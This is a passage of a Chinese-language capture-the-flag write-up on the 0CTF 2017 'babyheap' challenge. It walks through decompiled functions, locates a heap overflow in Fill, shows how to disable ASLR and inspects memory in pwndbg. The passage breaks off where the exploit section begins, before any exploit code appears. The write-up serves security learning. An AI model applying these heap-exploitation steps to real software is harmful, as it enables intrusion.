指向calloc出来的chunk_data</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Allocate Index %d\n"</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i);<br>      }<br>      <span class="hljs-keyword">return</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>传入的参数地址是get_addr 随机生成的地址。allocate函数是来创建堆块的，申请chunk最大的大小为4096。</p><p>首先输入堆块的content_size，然后调用calloc函数根据输入的content_size大小来创建堆块，最后堆块的信息保存在get_addr指针所指向的地址中。需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为\x00。<br>请注意，堆块的index是从0开始的<br>因此程序的结构体为：</p><blockquote><p>●chunk_flag:用来判断堆块是否存在<br>●chunk_content_size:#记录content的大小<br>●chunk_data_ptr:指向calloc出来的chunk_data</p></blockquote><h3 id="Fill-函数"><a href="#Fill-函数" class="headerlink" title="Fill-函数"></a>Fill 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Fill</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<span class="hljs-comment">//判断序号是否正确，判断flag为 chunk 是否存在</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>    v2 = input();<span class="hljs-comment">//又让输出size，改写 chunk 数据部分的内容,存在溢出!!</span><br>    <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content: "</span>);<br>      read_func2(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), v2); <span class="hljs-comment">//*(_QWORD *)(24LL * v1 + a1 + 16) == chunk_data</span><br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>上图是Fill函数分伪代码，这个函数的功能比较有意思，漏洞也是存在这个函数中的。<br>在填充内容的功能中，调用input函数来输入堆块的大小，并没有设置字符串结尾。而且比较有意思的是，这次又让我们重新输入了content_size，但是程序并没有将原来结构体中的content_size更改。且执行这个函数之后allocate chunk时堆块的size域没有改变，所以这里就出现了任意堆溢出的情形。</p><h3 id="Free-函数"><a href="#Free-函数" class="headerlink" title="Free-函数"></a>Free 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Free</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) = <span class="hljs-number">0</span>;<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>) = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>));<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>) = <span class="hljs-number">0LL</span>;     <span class="hljs-comment">// 指针置空</span><br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入序号，释放chunk。将 flag 字段，size 字段清0，free了数据chunk的指针同时也清0，不存在uaf</p><h3 id="Dump-函数"><a href="#Dump-函数" class="headerlink" title="Dump-函数"></a>Dump 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Dump</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Content: "</span>);<br>    write_func(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">puts</span>(byte_14F1);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入序号，打印内容</p><h2 id="gdb-动态调试"><a href="#gdb-动态调试" class="headerlink" title="gdb-动态调试"></a>gdb 动态调试</h2><p>还记得之前get_addr这个函数吗？这个函数主要使用来生成随机地址，其中指针也存放在哪里。</p><h3 id="关闭ASLR保护"><a href="#关闭ASLR保护" class="headerlink" title="关闭ASLR保护"></a>关闭ASLR保护</h3><p>由于这个程序开启了PIE保护，为了方便调试程序及查看堆内存，因此我们将Linux的ALSR(地址空间随机化)进行关闭。首先看一下ALSR开启的状态，可以使用下面的任意其中一种命令</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space<br><span class="hljs-number">2</span><br>ubuntu@ubuntu:~$ sysctl -a --pattern randomize<br>kernel.randomize_va_space = <span class="hljs-number">2</span><br>ubuntu@ubuntu:~$<br><br>###<br><span class="hljs-number">0</span> = 关闭<br><span class="hljs-number">1</span> = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（PIE也会影响heap的随机化）<br><span class="hljs-number">2</span> = 全随机。除了<span class="hljs-number">1</span>中所述，还有heap。<br>###<br></code></pre></td></tr></tbody></table></figure><p>现在关闭ASLR，关闭方法如下：<br><strong>方法一： 手动修改randomize_va_space文件</strong><br>上面介绍的randomize_va_space文件的枚举值含义，设置的值不同，linux内核加载程序的地址空间的策略就会不同。比较简单明了。这里0代表关闭ASLR。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-number">0</span> &gt; /proc/sys/kernel/randomize_va_space<br>#注意，这里是先进root权限，后执行。<br>#重启之后会恢复默认<br></code></pre></td></tr></tbody></table></figure><p><strong>方法二： 使用sysctl控制ASLR</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br>#重启之后将恢复默认<br>#如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。<br></code></pre></td></tr></tbody></table></figure><p><strong>方法三： 使用setarch控制单个程序的随机化</strong><br>如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">setarch `uname -m` -R ./your_program<br>#-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)<br></code></pre></td></tr></tbody></table></figure><p><strong>方法四： 在GDB场景下，使用set disable-randomization off</strong><br>在调试特定程序时，可以通过set disable-randomization命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。<br>当然，这里开启，关闭和查看的方法看起来就比较正规了。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">关闭ASLR：<br><span class="hljs-built_in">set</span> disable-randomization on<br>开启ASLR：<br><span class="hljs-built_in">set</span> disable-randomization off<br>查看ASLR状态：<br>show disable-randomization<br></code></pre></td></tr></tbody></table></figure><p>我们如何找到那个随机地址呢？通过多次对程序gdb调试，发现了一直变化的地址（此时的ASLR已关闭，参见下文章下面的内容），下面的代码框之中是两次gdb调试的内存分布：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png'><img src="https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png" alt="Snipaste_2023-09-13_15-53-21.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png'><img src="https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png" alt="Snipaste_2023-09-13_15-54-08.png"></p><p>通过对比发现，变动的只有第一行的地址：</p><p>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>0x40729d6e2000     0x40729d6e3000 rw-p     1000 0</p><p>​    0x2dd727226000     0x2dd727227000 rw-p     1000 0</p><p>到这里，可以猜测一下，程序的指针应该也存放在这片内存区域中。<br>我们重新gdb调试，通过执行函数Allocate和fill，来看一下这片内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0c<br>tf_2017$ gdb babyheap_0ctf_2017<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from babyheap_0ctf_2017...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017 <br>===== Baby Heap in <span class="hljs-number">2017</span> =====<br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">1</span><br>Size: <span class="hljs-number">20</span><br>Allocate Index <span class="hljs-number">0</span><br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">2</span><br>Index: <span class="hljs-number">0</span><br>Size: <span class="hljs-number">40</span><br>Content: aaaaaaaaaaaaaaaaaa<br>^C<br>Program received signal SIGINT, Interrupt.<br><span class="hljs-number">0x00007ffff7b04360</span> in __read_nocancel () at ../sysdeps/unix/syscall-template.S:<span class="hljs-number">84</span><br><span class="hljs-number">84</span>../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  <span class="hljs-number">0xfffffffffffffe00</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x15</span><br> RDI  <span class="hljs-number">0x0</span><br> RSI  <span class="hljs-number">0x555555757023</span> ◂— <span class="hljs-number">0x20fe10000000000</span><br> R8   <span class="hljs-number">0x7ffff7fdd700</span> ◂— <span class="hljs-number">0x7ffff7fdd700</span><br> R9   <span class="hljs-number">0x9</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x555555554a40</span> ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffdd50</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdc20</span> —▸ <span class="hljs-number">0x7fffffffdc50</span> —▸ <span class="hljs-number">0x7fffffffdc70</span> —▸ <span class="hljs-number">0x5555555553e0</span> ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdbf8</span> —▸ <span class="hljs-number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br> RIP  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► <span class="hljs-number">0x7ffff7b04360</span> &lt;__read_nocancel+<span class="hljs-number">7</span>&gt;     cmp    rax, <span class="hljs-number">-0xfff</span><br>   <span class="hljs-number">0x7ffff7b04366</span> &lt;__read_nocancel+<span class="hljs-number">13</span>&gt;    jae    read+<span class="hljs-number">73</span> &lt;<span class="hljs-number">0x7ffff7b04399</span>&gt;<br>    ↓<br>   <span class="hljs-number">0x7ffff7b04399</span> &lt;read+<span class="hljs-number">73</span>&gt;               mov    rcx, qword ptr [rip + <span class="hljs-number">0x2ccad8</span>]<br>   <span class="hljs-number">0x7ffff7b043a0</span> &lt;read+<span class="hljs-number">80</span>&gt;               neg    eax<br>   <span class="hljs-number">0x7ffff7b043a2</span> &lt;read+<span class="hljs-number">82</span>&gt;               mov    dword ptr fs:[rcx], eax<br>   <span class="hljs-number">0x7ffff7b043a5</span> &lt;read+<span class="hljs-number">85</span>&gt;               or     rax, <span class="hljs-number">0xffffffffffffffff</span><br>   <span class="hljs-number">0x7ffff7b043a9</span> &lt;read+<span class="hljs-number">89</span>&gt;               ret    <br> <br>   <span class="hljs-number">0x7ffff7b043aa</span>                         nop    word ptr [rax + rax]<br>   <span class="hljs-number">0x7ffff7b043b0</span> &lt;write&gt;                 cmp    dword ptr [rip + <span class="hljs-number">0x2d2389</span>], <span class="hljs-number">0</span> &lt;<span class="hljs-number">0x7ffff7dd6740</span>&gt;<br>   <span class="hljs-number">0x7ffff7b043b7</span> &lt;write+<span class="hljs-number">7</span>&gt;               jne    write+<span class="hljs-number">25</span> &lt;<span class="hljs-number">0x7ffff7b043c9</span>&gt;<br>    ↓<br>   <span class="hljs-number">0x7ffff7b043c9</span> &lt;write+<span class="hljs-number">25</span>&gt;              sub    rsp, <span class="hljs-number">8</span><br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdbf8</span> —▸ <span class="hljs-number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdc00</span> ◂— <span class="hljs-number">0x28</span> <span class="hljs-comment">/* '(' */</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdc08</span> —▸ <span class="hljs-number">0x555555757010</span> ◂— <span class="hljs-number">0x6161616161616161</span> (<span class="hljs-string">'aaaaaaaa'</span>)<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdc10</span> ◂— <span class="hljs-number">0x13</span><br>... ↓<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│ rbp  <span class="hljs-number">0x7fffffffdc20</span> —▸ <span class="hljs-number">0x7fffffffdc50</span> —▸ <span class="hljs-number">0x7fffffffdc70</span> —▸ <span class="hljs-number">0x5555555553e0</span> ◂— push   r15<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdc28</span> —▸ <span class="hljs-number">0x555555554f48</span> ◂— jmp    <span class="hljs-number">0x555555554f4e</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdc30</span> ◂— <span class="hljs-number">0x0</span><br>───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>     <span class="hljs-number">7f</span>fff7b04360 __read_nocancel+<span class="hljs-number">7</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">5555555551f</span>d<br>   f <span class="hljs-number">2</span>     <span class="hljs-number">555555554f</span>48<br>   f <span class="hljs-number">3</span>     <span class="hljs-number">555555555188</span><br>   f <span class="hljs-number">4</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>Program received signal SIGINT<br>pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x3b0326206000</span>     <span class="hljs-number">0x3b0326207000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x555555554000</span>     <span class="hljs-number">0x555555556000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555755000</span>     <span class="hljs-number">0x555555756000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555756000</span>     <span class="hljs-number">0x555555757000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555757000</span>     <span class="hljs-number">0x555555778000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <span class="hljs-number">0x7ffff7a0d000</span>     <span class="hljs-number">0x7ffff7bcd000</span> r-xp   <span class="hljs-number">1</span>c0000 <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7bcd000</span>     <span class="hljs-number">0x7ffff7dcd000</span> ---p   <span class="hljs-number">200000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dcd000</span>     <span class="hljs-number">0x7ffff7dd1000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd1000</span>     <span class="hljs-number">0x7ffff7dd3000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd3000</span>     <span class="hljs-number">0x7ffff7dd7000</span> rw-p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7dd7000</span>     <span class="hljs-number">0x7ffff7dfd000</span> r-xp    <span class="hljs-number">26000</span> <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7fdc000</span>     <span class="hljs-number">0x7ffff7fdf000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7ff7000</span>     <span class="hljs-number">0x7ffff7ffa000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffff7ffa000</span>     <span class="hljs-number">0x7ffff7ffc000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br>    <span class="hljs-number">0x7ffff7ffc000</span>     <span class="hljs-number">0x7ffff7ffd000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffd000</span>     <span class="hljs-number">0x7ffff7ffe000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffe000</span>     <span class="hljs-number">0x7ffff7fff000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffffffde000</span>     <span class="hljs-number">0x7ffffffff000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>再看一下 0x3b0326206000 这片内存区域，确定是程序结构体中指针存放的位置，标注一下：</p><p>这里我重新调试了一个gdb</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xb422b6be0c0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be0d0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000014</span><br>    #chunk_flag<span class="hljs-meta">#size</span><br><span class="hljs-number">0xb422b6be0e0</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000000</span><br>    #chunk_data_ptr<br><span class="hljs-number">0xb422b6be0f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be100</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be130</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h2 id="exp-讲解"><a href="#exp-讲解" class="headerlink" title="exp-讲解"></a>exp 讲解</h2><p>exp的主要内容如下：</p><blockquote><p>exp来自@yichen师傅：<a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a></p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 